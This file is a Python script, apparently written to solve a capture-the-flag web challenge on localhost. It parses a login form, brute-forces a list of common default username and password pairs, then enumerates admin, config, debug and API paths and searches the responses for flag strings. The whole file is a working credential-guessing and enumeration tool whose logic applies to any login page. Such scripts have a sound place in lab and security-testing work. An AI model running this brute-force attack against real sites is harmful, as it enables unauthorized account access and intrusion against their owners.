import requests
import re
import sys

TARGET_URL = "http://localhost:8080"
LOGIN_PATH = "/login"
TIMEOUT = 8

COMMON_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "admin888"),
    ("admin", "root"),
    ("admin", ""),
    ("root", "root"),
    ("root", "123456"),
    ("test", "test"),
    ("guest", "guest"),
    ("user", "user"),
    ("admin", "admin@123"),
    ("admin", "P@ssw0rd"),
    ("admin", "123456789"),
    ("admin", "qwerty"),
    ("admin", "abc123"),
    ("administrator", "administrator"),
    ("admin", "1"),
    ("admin", "12345678"),
]

PATHS_TO_ENUM = [
    "/",
    "/index",
    "/index.html",
    "/home",
    "/dashboard",
    "/admin",
    "/flag",
    "/api/flag",
    "/api/user",
    "/api/users",
    "/api/docs",
    "/docs",
    "/documents",
    "/files",
    "/upload",
    "/profile",
    "/user",
    "/users",
    "/config",
    "/debug",
    "/robots.txt",
    "/sitemap.xml",
    "/api/v1/user",
    "/api/v1/flag",
    "/api/v1/docs",
]

def extract_form_info(html):
    action_match = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', html, re.IGNORECASE)
    action = action_match.group(1) if action_match else ""
    
    method_match = re.search(r'<form[^>]*method=["\']([^"\']*)["\']', html, re.IGNORECASE)
    method = method_match.group(1).upper() if method_match else "GET"

    inputs = re.findall(r'<input[^>]*>', html, re.IGNORECASE)
    
    fields = {}
    for inp in inputs:
        name_match = re.search(r'name=["\']([^"\']*)["\']', inp, re.IGNORECASE)
        type_match = re.search(r'type=["\']([^"\']*)["\']', inp, re.IGNORECASE)
        value_match = re.search(r'value=["\']([^"\']*)["\']', inp, re.IGNORECASE)
        
        if name_match:
            field_name = name_match.group(1)
            field_type = type_match.group(1) if type_match else "text"
            field_value = value_match.group(1) if value_match else ""
            fields[field_name] = {"type": field_type, "value": field_value}
    
    hidden_fields = {k: v for k, v in fields.items() if v["type"] == "hidden"}
    
    return action, method, fields, hidden_fields

def try_login(session, login_url, action, method, fields, hidden_fields, username, password):
    data = {}
    data.update({k: v["value"] for k, v in hidden_fields.items()})
    
    username_field = None
    password_field = None
    
    for name, info in fields.items():
        if info["type"] == "password":
            password_field = name
        elif info["type"] in ("text", "email") and username_field is None:
            username_field = name
    
    if not username_field:
        for name in fields:
            if "user" in name.lower() or "name" in name.lower() or "account" in name.lower():
                username_field = name
                break
    if not username_field:
        username_field = "username"
    
    if not password_field:
        for name in fields:
            if "pass" in name.lower():
                password_field = name
                break
    if not password_field:
        password_field = "password"

    data[username_field] = username
    data[password_field] = password

    try:
        if method == "POST":
            resp = session.post(login_url, data=data, timeout=TIMEOUT, allow_redirects=True)
        else:
            resp = session.get(login_url, params=data, timeout=TIMEOUT, allow_redirects=True)
        return resp
    except requests.RequestException as e:
        print(f"[-] Request error: {e}")
        return None

def check_for_flag(text):
    patterns = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'f[l1]ag\{[^}]+\}',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(0)
    return None

def main():
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })

    login_url = TARGET_URL + LOGIN_PATH
    
    print(f"[*] Fetching login page: {login_url}")
    try:
        resp = session.get(login_url, timeout=TIMEOUT)
        html = resp.text
    except requests.RequestException as e:
        print(f"[-] Failed to fetch login page: {e}")
        sys.exit(1)

    print(f"[*] Response status: {resp.status_code}")
    print(f"[*] Response length: {len(html)}")

    flag = check_for_flag(html)
    if flag:
        print(f"[+] Flag found in login page: {flag}")

    action, method, fields, hidden_fields = extract_form_info(html)
    
    print(f"\n[*] Form action: {action}")
    print(f"[*] Form method: {method}")
    print(f"[*] Form fields: {fields}")
    if hidden_fields:
        print(f"[*] Hidden fields: {hidden_fields}")

    submit_url = action if action.startswith("http") else TARGET_URL + action
    if not action:
        submit_url = login_url

    print(f"\n[*] Submit URL: {submit_url}")
    print("[*] Starting credential brute force...")

    for username, password in COMMON_CREDENTIALS:
        print(f"  Trying: {username}:{password}", end="")
        resp = try_login(session, submit_url, action, method, fields, hidden_fields, username, password)
        
        if resp is None:
            print(" -> ERROR")
            continue

        flag = check_for_flag(resp.text)
        if flag:
            print(f" -> FLAG FOUND: {flag}")
            return

        error_indicators = ["error", "错误", "失败", "invalid", "wrong", "incorrect", "fail", "不存在", "密码"]
        is_error = any(ind in resp.text.lower() for ind in error_indicators)
        
        if resp.url != submit_url and resp.url != login_url:
            print(f" -> REDIRECT to {resp.url}")
            flag = check_for_flag(resp.text)
            if flag:
                print(f"[+] Flag found after redirect: {flag}")
                return
            
            print(f"\n[+] Login successful with {username}:{password}")
            print("[*] Enumerating paths with authenticated session...")
            
            for path in PATHS_TO_ENUM:
                full_url = TARGET_URL + path
                try:
                    r = session.get(full_url, timeout=TIMEOUT)
                    if r.status_code == 200 and len(r.text) > 100:
                        f = check_for_flag(r.text)
                        if f:
                            print(f"[+] Flag found at {full_url}: {f}")
                            return
                        print(f"  [+] {full_url} -> {r.status_code} ({len(r.text)} bytes)")
                except:
                    pass
            
            print("[*] Deep searching all responses for flags...")
            for path in PATHS_TO_ENUM:
                full_url = TARGET_URL + path
                try:
                    r = session.get(full_url, timeout=TIMEOUT)
                    f = check_for_flag(r.text)
                    if f:
                        print(f"[+] Flag found at {full_url}: {f}")
                        return
                except:
                    pass
            return
        
        if not is_error and resp.status_code == 200:
            if len(resp.text) != len(html):
                print(f" -> DIFFERENT RESPONSE ({len(resp.text)} bytes)")
                flag = check_for_flag(resp.text)
                if flag:
                    print(f"[+] Flag found: {flag}")
                    return
            else:
                print(" -> Same page")
        else:
            print(" -> Failed")

    print("\n[-] No successful login found with common credentials")
    print("[*] Trying default paths without auth...")
    for path in PATHS_TO_ENUM:
        full_url = TARGET_URL + path
        try:
            r = session.get(full_url, timeout=TIMEOUT)
            f = check_for_flag(r.text)
            if f:
                print(f"[+] Flag found at {full_url}: {f}")
                return
            if r.status_code == 200 and len(r.text) > 50:
                print(f"  [+] {full_url} -> {r.status_code} ({len(r.text)} bytes)")
        except:
            pass

if __name__ == "__main__":
    main()